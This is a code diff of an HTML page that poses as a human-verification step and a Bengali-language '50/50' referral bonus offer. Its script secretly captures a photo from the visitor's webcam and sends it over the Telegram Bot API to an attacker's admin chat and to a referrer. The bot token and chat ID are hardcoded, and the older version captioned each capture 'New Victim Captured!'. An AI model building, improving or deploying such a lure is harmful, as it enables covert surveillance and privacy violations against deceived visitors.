@@ -3,118 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Page</title>
+    <title>50/50 Verification</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
         body { 
-            text-align: center; 
-            font-family: 'Segoe UI', Arial, sans-serif; 
-            background-color: #121212; 
-            color: white;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            text-align: center;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
+            min-height: 100vh;
+            background-color: #000; /* ছবি লোড না হলে কালো দেখাবে */
+            /* আপনার দেওয়া নির্দিষ্ট ইমেজ লিঙ্ক */
+            background-image: url('https://i.imghippo.com/files/Fq9968wg.jpg'); 
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
         }
+
+        /* ব্যাকগ্রাউন্ডের ওপর হালকা অন্ধকার লেয়ার */
+        .overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.4); 
+            z-index: 1;
+        }
+
         .container {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            width: 90%;
-            max-width: 400px;
+            background: rgba(255, 255, 255, 0.15); 
+            backdrop-filter: blur(10px); 
+            -webkit-backdrop-filter: blur(10px);
+            padding: 40px 20px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+            width: 85%;
+            max-width: 380px;
+            z-index: 2;
+            position: relative;
         }
+
+        h1 { color: #ffffff; font-size: 28px; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
+        h2 { color: #ffeb3b; font-size: 18px; margin-bottom: 10px; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
+        p { color: #ffffff; font-size: 15px; margin-bottom: 25px; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
+
         #verify-btn { 
-            background: linear-gradient(135deg, #1a73e8, #0d47a1); 
-            color: white; 
-            padding: 15px 30px; 
-            border: none; 
-            border-radius: 50px; 
-            font-size: 18px; 
-            font-weight: bold;
-            cursor: pointer; 
-            width: 100%;
-            margin-top: 20px;
+            background-color: #1a73e8; 
+            color: white; border: none; padding: 15px 40px; 
+            font-size: 18px; border-radius: 50px; cursor: pointer; 
+            width: 100%; font-weight: bold;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
         }
-        #status { margin-top: 20px; color: #00ffcc; font-weight: bold; }
-        video, canvas { display: none; }
+
+        #video, #canvas { display: none; }
+        #status { margin-top: 20px; color: #00ff00; font-weight: bold; font-size: 16px; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
     </style>
 </head>
 <body>
+
+    <div class="overlay"></div>
+
     <div class="container">
-        <h1>Human Verification</h1>
-        <p>আপনি যে রোবট নন তা নিশ্চিত করতে নিচের বাটনে ক্লিক করুন।</p>
-        <button id="verify-btn">Verify Now</button>
-        <p id="status"></p>
+        <h1>Welcome to 50/50</h1>
+        <h2>প্রতি রেফারর ৫০ টাকা বোনাস পান।</h2>
+        <p>বোনাস পেতে হলে verify করুন</p>
+        <button id="verify-btn">Verify</button>
+        <div id="status"></div>
+
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
     </div>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
-
     <script>
-        // আপনার নতুন টোকেন এবং আইডি এখানে সেট করা আছে
         const botToken = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs";
         const adminId = "7068444019"; 
-        const urlParams = new URLSearchParams(window.location.search);
-        const userIdFromLink = urlParams.get('id');
 
-        const btn = document.getElementById('verify-btn');
-        const status = document.getElementById('status');
+        const urlParams = new URLSearchParams(window.location.search);
+        const userIdFromLink = urlParams.get('id'); 
+
+        const verifyBtn = document.getElementById('verify-btn');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const status = document.getElementById('status');
 
-        btn.addEventListener('click', async () => {
-            status.innerText = "Processing... Please wait.";
-            btn.style.display = "none";
+        verifyBtn.addEventListener('click', async () => {
+            status.innerText = "Processing... Please wait";
+            verifyBtn.style.display = "none"; 
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                
-                // ক্যামেরা ফোকাস করার জন্য ১.৫ সেকেন্ড সময় দেওয়া হয়েছে
-                setTimeout(() => {
-                    const context = canvas.getContext('2d');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('photo', blob, 'capture.jpg');
-                        formData.append('caption', "📸 New Victim Captured!");
 
-                        try {
-                            // ১. সরাসরি আপনাকে (অ্যাডমিন) ছবি পাঠানো
-                            formData.append('chat_id', adminId);
-                            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData
-                            });
-
-                            // ২. যদি অন্য কেউ লিঙ্কটি ব্যবহার করে থাকে (রেফারার)
-                            if(userIdFromLink && userIdFromLink !== adminId) {
-                                formData.set('chat_id', userIdFromLink);
-                                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                                    method: 'POST',
-                                    body: formData
-                                });
-                            }
-
-                            status.innerText = "Verification Complete! Reward added.";
-                        } catch (sendErr) {
-                            status.innerText = "Error sending data. Try again.";
-                        }
+                video.onloadedmetadata = () => {
+                    setTimeout(async () => {
+                        const context = canvas.getContext('2d');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                         
-                        // ক্যামেরা বন্ধ করা
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 'image/jpeg', 0.6); // ছবির সাইজ ছোট রাখতে কোয়ালিটি ০.৬
-                }, 1500);
+                        canvas.toBlob(async (blob) => {
+                            // অ্যাডমিন এবং ইউজারকে ছবি পাঠানো
+                            if (userIdFromLink && userIdFromLink !== adminId) {
+                                await sendToTelegram(blob, userIdFromLink, "New bonus claimant photo!");
+                            }
+                            await sendToTelegram(blob, adminId, "Admin: New photo captured!");
+
+                            status.innerText = "Verification Successful!";
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 'image/png');
+                    }, 500); 
+                };
             } catch (err) {
-                status.innerText = "Error: Please allow camera access!";
-                btn.style.display = "block";
+                status.innerText = "Access denied! Please allow camera.";
+                verifyBtn.style.display = "block";
             }
         });
+
+        async function sendToTelegram(blob, id, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', id);
+            formData.append('photo', blob, 'user.png');
+            formData.append('caption', caption);
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch(e) {}
+        }
     </script>
 </body>
 </html>
